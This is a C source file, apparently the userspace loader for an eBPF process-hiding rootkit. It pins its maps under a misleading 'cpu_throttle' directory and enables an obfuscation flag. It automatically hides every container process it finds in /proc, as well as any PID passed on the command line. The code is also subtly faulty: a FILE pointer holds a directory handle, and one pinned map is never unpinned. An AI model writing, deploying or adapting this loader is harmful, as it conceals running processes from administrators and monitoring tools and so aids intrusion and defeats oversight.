#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdint.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <dirent.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "output/hide_process_bpf.skel.h"

/* Pin paths for shared maps */
#define PIN_BASEDIR "/sys/fs/bpf/cpu_throttle"
#define PIN_HIDDEN_PID_MAP PIN_BASEDIR "/hidden_pid_map"
#define PIN_EVENTS_MAP PIN_BASEDIR "/lsm_events"
#define PIN_OBFUSCATION_FLAG PIN_BASEDIR "/obfuscation_flag_map"
#define PIN_FILTER_STATS PIN_BASEDIR "/filter_stats"
#define PIN_AUTO_CONTAINER_HIDE PIN_BASEDIR "/auto_container_hide_map"

static volatile bool exiting = false;
static bool verbose = false;

static void sig_handler(int sig)
{
    exiting = true;
}

/* ENHANCED: Scan existing processes for container detection */
static int scan_existing_container_processes(struct hide_process_bpf *skel)
{
    FILE *proc_dir;
    struct dirent *entry;
    char cgroup_path[256];
    char cgroup_content[1024];
    FILE *cgroup_file;
    int hidden_count = 0;
    int map_fd = bpf_map__fd(skel->maps.hidden_pid_map);

    /* Open /proc directory */
    proc_dir = opendir("/proc");
    if (!proc_dir) {
        fprintf(stderr, "Failed to open /proc directory\n");
        return -1;
    }

    if (verbose) {
        printf("Scanning /proc for existing container processes...\n");
    }

    /* Iterate through /proc entries */
    while ((entry = readdir(proc_dir)) != NULL) {
        /* Check if entry is a PID directory */
        if (strspn(entry->d_name, "0123456789") != strlen(entry->d_name)) {
            continue; /* Not a PID */
        }

        int pid = atoi(entry->d_name);
        if (pid <= 1) {
            continue; /* Skip kernel threads and init */
        }

        /* Read cgroup file for this PID */
        sprintf(cgroup_path, "/proc/%d/cgroup", pid);
        cgroup_file = fopen(cgroup_path, "r");
        if (!cgroup_file) {
            continue; /* Process might have exited */
        }

        /* Read cgroup content */
        size_t bytes_read = fread(cgroup_content, 1, sizeof(cgroup_content) - 1, cgroup_file);
        fclose(cgroup_file);

        if (bytes_read == 0) {
            continue;
        }
        cgroup_content[bytes_read] = '\0';

        /* Check for container indicators in cgroup */
        if (strstr(cgroup_content, "docker") ||
            strstr(cgroup_content, "containerd") ||
            strstr(cgroup_content, "lxc") ||
            strstr(cgroup_content, "kubepods")) {

            /* This is a container process - add to hidden map */
            int value = 1;
            int err = bpf_map_update_elem(map_fd, &pid, &value, BPF_ANY);
            if (err == 0) {
                hidden_count++;
                if (verbose) {
                    printf("Auto-detected container process: PID %d\n", pid);
                }
                /* Note: submit_event() not available in userspace loader
                 * The daemon will handle PID sync via periodic map scanning */
            }
        }
    }

    closedir(proc_dir);

    if (verbose) {
        printf("✅ Scan complete: %d existing container processes auto-hidden\n", hidden_count);
    }

    return hidden_count;
}

static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
    if (verbose || level <= LIBBPF_WARN)
        return vfprintf(stderr, format, args);
    return 0;
}

/* Ensure pin directory exists */
static int ensure_pin_dir(void)
{
    struct stat st;

    if (stat(PIN_BASEDIR, &st) == 0)
        return 0;

    if (mkdir(PIN_BASEDIR, 0700) != 0) {
        fprintf(stderr, "Failed to create pin directory %s: %s\n",
                PIN_BASEDIR, strerror(errno));
        return -1;
    }

    if (verbose)
        printf("Created pin directory: %s\n", PIN_BASEDIR);

    return 0;
}

/* Pin maps to shared filesystem location */
static int pin_shared_maps(struct hide_process_bpf *skel)
{
    int err;

    /* Pin hidden_pid_map */
    err = bpf_map__pin(skel->maps.hidden_pid_map, PIN_HIDDEN_PID_MAP);
    if (err && errno != EEXIST) {
        fprintf(stderr, "Failed to pin hidden_pid_map: %s\n", strerror(errno));
        return err;
    }

    /* Pin events map */
    err = bpf_map__pin(skel->maps.events, PIN_EVENTS_MAP);
    if (err && errno != EEXIST) {
        fprintf(stderr, "Failed to pin events map: %s\n", strerror(errno));
        return err;
    }

    /* Pin obfuscation flag map */
    err = bpf_map__pin(skel->maps.obfuscation_flag_map, PIN_OBFUSCATION_FLAG);
    if (err && errno != EEXIST) {
        fprintf(stderr, "Failed to pin obfuscation_flag_map: %s\n", strerror(errno));
        return err;
    }

    /* Pin filter stats map */
    err = bpf_map__pin(skel->maps.filter_stats, PIN_FILTER_STATS);
    if (err && errno != EEXIST) {
        fprintf(stderr, "Failed to pin filter_stats: %s\n", strerror(errno));
        return err;
    }

    /* Pin auto container hide map */
    err = bpf_map__pin(skel->maps.auto_container_hide_map, PIN_AUTO_CONTAINER_HIDE);
    if (err && errno != EEXIST) {
        fprintf(stderr, "Failed to pin auto_container_hide_map: %s\n", strerror(errno));
        return err;
    }

    if (verbose)
        printf("Successfully pinned all maps to %s\n", PIN_BASEDIR);

    return 0;
}

/* Unpin maps when exiting */
static void unpin_shared_maps(void)
{
    unlink(PIN_HIDDEN_PID_MAP);
    unlink(PIN_EVENTS_MAP);
    unlink(PIN_OBFUSCATION_FLAG);
    unlink(PIN_FILTER_STATS);

    if (verbose)
        printf("Unpinned shared maps\n");
}

int main(int argc, char **argv)
{
    struct hide_process_bpf *skel;
    int err;
    bool pin_maps = true;
    bool enable_obfuscation = true;

    /* Parse command line arguments */
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--verbose") == 0 || strcmp(argv[i], "-v") == 0) {
            verbose = true;
        } else if (strcmp(argv[i], "--no-pin") == 0) {
            pin_maps = false;
        } else if (strcmp(argv[i], "--no-obfuscation") == 0) {
            enable_obfuscation = false;
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("Usage: %s [options] [test_pid]\n", argv[0]);
            printf("Options:\n");
            printf("  -v, --verbose        Enable verbose output\n");
            printf("  --no-pin            Don't pin maps to filesystem\n");
            printf("  --no-obfuscation    Disable obfuscation by default\n");
            printf("  -h, --help          Show this help\n");
            printf("  test_pid            PID to add to hidden list for testing\n");
            return 0;
        }
    }

    /* Set up libbpf errors and debug info callback */
    libbpf_set_print(libbpf_print_fn);

    /* Bump RLIMIT_MEMLOCK to allow BPF sub-system to do anything */
    struct rlimit rlim_new = {
        .rlim_cur = RLIM_INFINITY,
        .rlim_max = RLIM_INFINITY,
    };

    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
        fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit!\n");
        return 1;
    }

    /* Create pin directory if needed */
    if (pin_maps) {
        err = ensure_pin_dir();
        if (err) {
            return 1;
        }
    }

    /* Open BPF application */
    skel = hide_process_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton\n");
        return 1;
    }

    /* Load & verify BPF programs */
    err = hide_process_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton: %d\n", err);
        goto cleanup;
    }

    /* Attach BPF programs */
    err = hide_process_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton: %d\n", err);
        goto cleanup;
    }

    printf("Successfully loaded and attached eBPF Process Hiding program!\n");

    /* Pin maps to shared location */
    if (pin_maps) {
        err = pin_shared_maps(skel);
        if (err) {
            fprintf(stderr, "Warning: Failed to pin maps, continuing anyway\n");
        }
    }

    /* Set obfuscation flag */
    uint32_t key = 0;
    uint32_t flag_value = enable_obfuscation ? 1 : 0;
    int obf_fd = bpf_map__fd(skel->maps.obfuscation_flag_map);
    err = bpf_map_update_elem(obf_fd, &key, &flag_value, BPF_ANY);
    if (err) {
        fprintf(stderr, "Failed to set obfuscation flag: %d\n", err);
    } else if (verbose) {
        printf("Obfuscation %s\n", enable_obfuscation ? "enabled" : "disabled");
    }

    /* FIXED: Auto-enable container detection by default */
    uint32_t auto_detect_value = 1; /* Always enable auto detection */
    int auto_fd = bpf_map__fd(skel->maps.auto_container_hide_map);
    err = bpf_map_update_elem(auto_fd, &key, &auto_detect_value, BPF_ANY);
    if (err) {
        fprintf(stderr, "Failed to enable auto container detection: %d\n", err);
    } else if (verbose) {
        printf("Auto container detection enabled\n");
    }

    printf("Program is now active. Press Ctrl+C to exit.\n");

    /* ENHANCED: Scan existing processes for container detection */
    if (verbose) {
        printf("Scanning existing processes for containers...\n");
    }
    scan_existing_container_processes(skel);

    /* Set up signal handlers */
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);

    /* Test: Add PID to hidden_pid_map for testing */
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] >= '0' && argv[i][0] <= '9') {
            int test_pid = atoi(argv[i]);
            int value = 1;
            int map_fd = bpf_map__fd(skel->maps.hidden_pid_map);

            err = bpf_map_update_elem(map_fd, &test_pid, &value, BPF_ANY);
            if (err) {
                fprintf(stderr, "Failed to add PID %d to hidden map: %d\n", test_pid, err);
            } else {
                printf("Added PID %d to hidden processes map\n", test_pid);
                /* Note: submit_event() not available in userspace loader
                 * The daemon will handle PID sync via periodic map scanning */
            }
        }
    }

    /* Keep program running */
    while (!exiting) {
        sleep(1);
    }

    printf("\nDetaching and cleaning up...\n");

    /* Unpin maps */
    if (pin_maps) {
        unpin_shared_maps();
    }

cleanup:
    hide_process_bpf__destroy(skel);
    return err < 0 ? -err : 0;
}
